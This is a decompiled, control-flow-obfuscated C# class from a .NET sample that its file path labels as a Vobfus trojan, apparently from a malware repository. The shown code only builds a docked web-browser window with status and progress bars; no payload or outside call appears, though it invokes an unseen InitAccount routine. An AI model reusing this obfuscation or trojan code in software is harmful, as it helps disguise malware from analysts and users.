// Decompiled with JetBrains decompiler
// Type: GLuaR.Shared.ClassWrapper
// Assembly: c, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCB3E154-F36D-403E-8019-8861E9AEB8FC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Vobfus.gen-191db013c67081442ef5e75edd00c2572f6ec9d7f629ddac9bba8942722c061d.exe

using Fireball.Docking;
using GLuaR.Importers;
using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace GLuaR.Shared
{
  internal class ClassWrapper : DockableWindow
  {
    private Panel indexerWrapper;
    private StatusStrip _ContextWrapper;
    private ToolStripStatusLabel advisorWrapper;
    private ToolStripProgressBar filterWrapper;
    private WebBrowser m_ModelWrapper;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ClassWrapper(string asset)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_6;
            case 1:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              goto case 2;
            case 2:
            case 4:
              this.CalcRule();
              if (ClassWrapper.ValidateRegistry())
              {
                num2 = 5;
                continue;
              }
              goto case 1;
            case 5:
              goto label_7;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 4;
        continue;
label_6:
        ImporterMapper.InitAccount();
        num1 = 1;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalcRule()
    {
      int num1 = 11;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_5;
            case 1:
              goto label_13;
            case 2:
              goto label_16;
            case 3:
              goto label_1;
            case 4:
              this.indexerWrapper.Controls.Add((Control) this._ContextWrapper);
              this.indexerWrapper.Controls.Add((Control) this.m_ModelWrapper);
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto case 13;
            case 5:
              this._ContextWrapper.Name = "ss";
              this._ContextWrapper.Size = new Size(710, 22);
              goto case 8;
            case 6:
              goto label_2;
            case 7:
              goto label_6;
            case 8:
            case 14:
              this._ContextWrapper.SizingGrip = false;
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 9;
            case 9:
            case 12:
              this.m_ModelWrapper.Navigated += new WebBrowserNavigatedEventHandler(this.FindRule);
              num2 = 0;
              continue;
            case 10:
              goto label_4;
            case 11:
              this.indexerWrapper = new Panel();
              num2 = 10;
              continue;
            case 13:
              this.m_ModelWrapper = new WebBrowser();
              this.indexerWrapper.SuspendLayout();
              this._ContextWrapper.SuspendLayout();
              ((Control) this).SuspendLayout();
              num2 = 4;
              continue;
            case 15:
              goto label_17;
            case 16:
              goto label_18;
            case 17:
              goto label_19;
            default:
              goto label_12;
          }
        }
label_1:
        this.indexerWrapper.Dock = DockStyle.Fill;
        this.indexerWrapper.Location = new Point(0, 0);
        this.indexerWrapper.Name = "pnlContent";
        this.indexerWrapper.Size = new Size(710, 381);
        this.indexerWrapper.TabIndex = 1;
        num1 = 6;
        continue;
label_2:
        this._ContextWrapper.Items.AddRange(new ToolStripItem[2]
        {
          (ToolStripItem) this.advisorWrapper,
          (ToolStripItem) this.filterWrapper
        });
        this._ContextWrapper.LayoutStyle = ToolStripLayoutStyle.HorizontalStackWithOverflow;
        this._ContextWrapper.Location = new Point(0, 359);
        num1 = 5;
        continue;
label_4:
        this._ContextWrapper = new StatusStrip();
        num1 = 16;
        continue;
label_5:
        ((Form) this).ClientSize = new Size(710, 381);
        ((Control) this).Controls.Add((Control) this.indexerWrapper);
        num1 = 15;
        continue;
label_6:
        this.m_ModelWrapper.Navigating += new WebBrowserNavigatingEventHandler(this.RestartRule);
        this.m_ModelWrapper.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.ResetRule);
        num1 = 9;
        continue;
label_12:
        num1 = 14;
        continue;
label_13:
        this._ContextWrapper.TabIndex = 2;
        this._ContextWrapper.Text = "statusStrip1";
        this.advisorWrapper.Name = "lblstatus";
        this.advisorWrapper.Size = new Size(36, 17);
        this.advisorWrapper.Text = "Done.";
        this.filterWrapper.Alignment = ToolStripItemAlignment.Right;
        this.filterWrapper.Name = "pb";
        this.filterWrapper.Size = new Size(100, 16);
        this.m_ModelWrapper.AllowWebBrowserDrop = false;
        num1 = 2;
        continue;
label_16:
        this.m_ModelWrapper.Dock = DockStyle.Fill;
        this.m_ModelWrapper.IsWebBrowserContextMenuEnabled = false;
        this.m_ModelWrapper.Location = new Point(0, 0);
        this.m_ModelWrapper.MinimumSize = new Size(20, 20);
        this.m_ModelWrapper.Name = "wb";
        this.m_ModelWrapper.Size = new Size(710, 381);
        this.m_ModelWrapper.TabIndex = 1;
        this.m_ModelWrapper.WebBrowserShortcutsEnabled = false;
        this.m_ModelWrapper.ProgressChanged += new WebBrowserProgressChangedEventHandler(this.VisitRule);
        num1 = 7;
        continue;
label_17:
        this.DockableAreas = (DockAreas) 32;
        ((Control) this).DoubleBuffered = true;
        ((Form) this).FormBorderStyle = FormBorderStyle.FixedToolWindow;
        ((Control) this).Name = "WebWindow";
        this.TabText = "Web";
        ((Control) this).Text = "Web";
        this.ToolTipText = "Web";
        ((Form) this).Load += new EventHandler(this.DestroyRule);
        ((Control) this).Resize += new EventHandler(this.ExcludeRule);
        this.indexerWrapper.ResumeLayout(false);
        this.indexerWrapper.PerformLayout();
        this._ContextWrapper.ResumeLayout(false);
        this._ContextWrapper.PerformLayout();
        ((Control) this).ResumeLayout(false);
        num1 = 17;
        continue;
label_18:
        this.advisorWrapper = new ToolStripStatusLabel();
        this.filterWrapper = new ToolStripProgressBar();
        num1 = 13;
      }
label_19:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DestroyRule(object instance, EventArgs map) => this.indexerWrapper.Location = new Point(((Control) this).Width / 2 - this.indexerWrapper.Width / 2, ((Control) this).Height / 2 - this.indexerWrapper.Height / 2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ExcludeRule(object param, EventArgs b) => this.indexerWrapper.Location = new Point(((Control) this).Width / 2 - this.indexerWrapper.Width / 2, ((Control) this).Height / 2 - this.indexerWrapper.Height / 2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FindRule(object ident, WebBrowserNavigatedEventArgs result)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            this.ToolTipText = this.m_ModelWrapper.Document.Title + " - " + this.m_ModelWrapper.Url?.ToString();
            int num2 = 4;
            num1 = ClassWrapper.PopRegistry() ? num2 : num2;
            continue;
          case 2:
          case 3:
            this.filterWrapper.Value = 0;
            goto case 5;
          case 4:
            this.TabText = this.m_ModelWrapper.DocumentTitle;
            num1 = 3;
            continue;
          case 5:
            this.advisorWrapper.Text = "Done.";
            this.filterWrapper.Visible = false;
            num1 = 6;
            continue;
          case 6:
            goto label_7;
          default:
            num1 = 5;
            continue;
        }
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RestartRule(object key, WebBrowserNavigatingEventArgs cont)
    {
      int num = 1;
      if (ClassWrapper.ValidateRegistry())
        goto label_4;
label_1:
      this.filterWrapper.Visible = true;
      num = 5;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            this.advisorWrapper.Text = "Loading: " + cont.Url?.ToString();
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_3;
          case 2:
          case 4:
            goto label_1;
          case 3:
            goto label_3;
          case 5:
            goto label_7;
          default:
            num = 4;
            continue;
        }
      }
label_3:
      this.filterWrapper.Value = 0;
      goto label_1;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void VisitRule(object config, WebBrowserProgressChangedEventArgs attr)
    {
      this.filterWrapper.Maximum = (int) attr.MaximumProgress;
      this.filterWrapper.Value = (int) attr.CurrentProgress;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ResetRule(object def, WebBrowserDocumentCompletedEventArgs ivk)
    {
    }

    internal static bool ValidateRegistry() => true;

    internal static bool PopRegistry() => false;
  }
}
